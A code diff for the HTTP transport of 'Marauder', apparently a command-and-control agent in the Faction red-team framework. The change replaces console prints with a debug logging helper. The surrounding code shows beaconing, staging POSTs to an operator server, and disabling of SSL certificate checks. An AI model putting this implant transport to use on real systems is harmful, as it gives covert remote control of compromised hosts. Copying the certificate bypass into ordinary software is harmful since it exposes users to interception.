@@ -11,6 +11,14 @@ using Newtonsoft.Json;
 
 namespace Faction.Modules.Dotnet
 {
+  #if DEBUG
+    public static class Logging
+    {
+      public static void Log(string message) {
+        Console.WriteLine($"({DateTime.Now.ToString("o")}) [Marauder HTTP Transport] - {message}");
+      }
+    }
+#endif
   public class HTTPTransport : AgentTransport
   {
     public class Profile
@@ -24,14 +32,14 @@ namespace Faction.Modules.Dotnet
     public HTTPTransport() {
       try {
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Initializing..");
+        Logging.Log($"Initializing..");
 #endif
         Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("HttpTransport.settings.json");
         _profile = JsonConvert.DeserializeObject<Profile>(new StreamReader(settingsStream).ReadToEnd());
       }
       catch (Exception e) {
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Problem initializing transport: {e.Message}");
+        Logging.Log($"Problem initializing transport: {e.Message}");
 #endif
       }
     }
@@ -39,7 +47,7 @@ namespace Faction.Modules.Dotnet
     private WebClient CreateWebClient(bool ignoreSSL, string profile)
     {
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Creating Web Client..");
+        Logging.Log($"Creating Web Client..");
 #endif
       WebClient _webClient = new WebClient();
 
@@ -49,6 +57,9 @@ namespace Faction.Modules.Dotnet
 
       if (ignoreSSL)
       {
+#if DEBUG
+        Logging.Log($"Ignoring SSL per configuration..");
+#endif
         //Change SSL checks so that all checks pass
         ServicePointManager.ServerCertificateValidationCallback =
            new RemoteCertificateValidationCallback(
@@ -93,7 +104,7 @@ namespace Faction.Modules.Dotnet
     private Dictionary<string, string> DoStagePost(string StageName, string StagingId, string StageMessage)
     {
 #if DEBUG
-      Console.WriteLine($"[Marauder HTTP Transport] Doing a Stage POST.");
+      Logging.Log($"Doing a Stage POST.");
 #endif
       Dictionary<string, string> response = new Dictionary<string, string>();
 
@@ -102,6 +113,10 @@ namespace Faction.Modules.Dotnet
         string beaconUrl = String.Format($"{_profile.HttpPost["Server"]["Host"]}{_profile.HttpPost["Server"]["URLs"]}");
 
         bool _ignoreSSL = _profile.HttpPost["Server"]["IgnoreSSL"] == "true";
+
+#if DEBUG
+        Logging.Log($"IgnoreSSL set to {_ignoreSSL}");
+#endif
 
         // Create a new WebClient object and load the Headers/Cookies per the Client Profile
         WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpPost");
@@ -146,7 +161,7 @@ namespace Faction.Modules.Dotnet
 
         _webClient.Headers.Add(HttpRequestHeader.ContentType, "application/json");
 #if DEBUG
-        Console.WriteLine($"[Marauder Http Transport] Sending POST. URL: {beaconUrl} Message: {jsonMessage}");
+        Logging.Log($"Sending POST. URL: {beaconUrl} Message: {jsonMessage}");
 #endif
         string content = _webClient.UploadString(beaconUrl, jsonMessage);
 
@@ -159,7 +174,7 @@ namespace Faction.Modules.Dotnet
       {
         // We don't want to cause an breaking exception if it fails to connect
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Connection failed: {e.Message}");
+        Logging.Log($"Connection failed: {e.Message}");
 #endif
 
         response.Add("Message", "ERROR");
@@ -170,7 +185,7 @@ namespace Faction.Modules.Dotnet
     private Dictionary<string, string> DoGetRequest(string AgentName, string Message)
     {
 #if DEBUG
-      Console.WriteLine($"[Marauder HTTP Transport] Doing a GET.");
+      Logging.Log($"Doing a GET.");
 #endif
       Dictionary<string, string> response = new Dictionary<string, string>();
 
@@ -203,12 +218,12 @@ namespace Faction.Modules.Dotnet
           _webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_nameLocation.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries)[1]}={AgentName}");
 
 #if DEBUG
-        Console.WriteLine($"[Marauder Http Transport] Sending Get. URL: {beaconUrl}");
+        Logging.Log($"Sending Get. URL: {beaconUrl}");
 #endif
 
         string content = _webClient.DownloadString(beaconUrl);
 #if DEBUG
-        Console.WriteLine($"[Marauder Http Transport] Got response. {content}");
+        Logging.Log($"Got response. {content}");
 #endif
 
         // parse the content based on the "shared" configuration
@@ -220,7 +235,7 @@ namespace Faction.Modules.Dotnet
       {
         // We don't want to cause an breaking exception if it fails to connect
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Connection failed: {e.Message}");
+        Logging.Log($"Connection failed: {e.Message}");
 #endif
 
         response.Add("Message", "ERROR");
@@ -230,7 +245,7 @@ namespace Faction.Modules.Dotnet
     private Dictionary<string, string> DoPostRequest(string AgentName, string Message)
     {
 #if DEBUG
-      Console.WriteLine($"[Marauder HTTP Transport] Doing a POST.");
+      Logging.Log($"Doing a POST.");
 #endif
       Dictionary<string, string> response = new Dictionary<string, string>();
 
@@ -281,7 +296,7 @@ namespace Faction.Modules.Dotnet
         _webClient.Headers.Add(HttpRequestHeader.ContentType, "application/json");
 
 #if DEBUG
-        Console.WriteLine($"[Marauder Http Transport] Sending POST. URL: {beaconUrl} Message: {jsonMessage}");
+        Logging.Log($"Sending POST. URL: {beaconUrl} Message: {jsonMessage}");
 #endif
 
         string content = _webClient.UploadString(beaconUrl, jsonMessage);
@@ -295,7 +310,7 @@ namespace Faction.Modules.Dotnet
       {
         // We don't want to cause an breaking exception if it fails to connect
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Connection failed: {e.Message}");
+        Logging.Log($"Connection failed: {e.Message}");
 #endif
 
         response.Add("Message", "ERROR");
@@ -306,7 +321,7 @@ namespace Faction.Modules.Dotnet
     {
 
 #if DEBUG
-      Console.WriteLine($"[Marauder HTTP Transport] Getting Payload Content..");
+      Logging.Log($"Getting Payload Content..");
 #endif
       Dictionary<string, string> _message = new Dictionary<string, string>();
 
@@ -373,7 +388,7 @@ namespace Faction.Modules.Dotnet
     public override string Stage(string StageName, string StagingId, string Message)
     {
 #if DEBUG
-      Console.WriteLine($"[Marauder HTTP Transport] Sending Stage Request. Name: {StageName}, Id: {StagingId}, Message: {Message}");
+      Logging.Log($"Sending Stage Request. Name: {StageName}, Id: {StagingId}, Message: {Message}");
 #endif
       Dictionary<string, string> responseDict = new Dictionary<string, string>();
       responseDict = DoStagePost(StageName, StagingId, Message);
@@ -384,7 +399,7 @@ namespace Faction.Modules.Dotnet
     public override string Beacon(string AgentName, string Message)
     {
 #if DEBUG
-      Console.WriteLine($"[Marauder HTTP Transport] Beaconing..");
+      Logging.Log($"Beaconing..");
 #endif
       Dictionary<string, string> responseDict = new Dictionary<string, string>();
 
@@ -392,7 +407,7 @@ namespace Faction.Modules.Dotnet
       if (String.IsNullOrEmpty(Message))
       {
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Sending Beacon: AgentName: {AgentName} Message: {Message}");
+        Logging.Log($"Sending Beacon: AgentName: {AgentName} Message: {Message}");
 #endif
         responseDict = DoGetRequest(AgentName, Message);
       }
@@ -401,7 +416,7 @@ namespace Faction.Modules.Dotnet
       else
       {
 #if DEBUG
-        Console.WriteLine($"[Marauder HTTP Transport] Sending Beacon: AgentName: {AgentName} Message: {Message}");
+        Logging.Log($"Sending Beacon: AgentName: {AgentName} Message: {Message}");
 #endif
         responseDict = DoPostRequest(AgentName, Message);
       }
@@ -414,7 +429,7 @@ namespace Faction.Modules.Dotnet
     public static List<AgentTransport> GetTransports()
     {
 #if DEBUG
-      Console.WriteLine($"[Marauder HTTP Transport] Initializing..");
+      Logging.Log($"Initializing..");
 #endif
 
       List<AgentTransport> transports = new List<AgentTransport>();
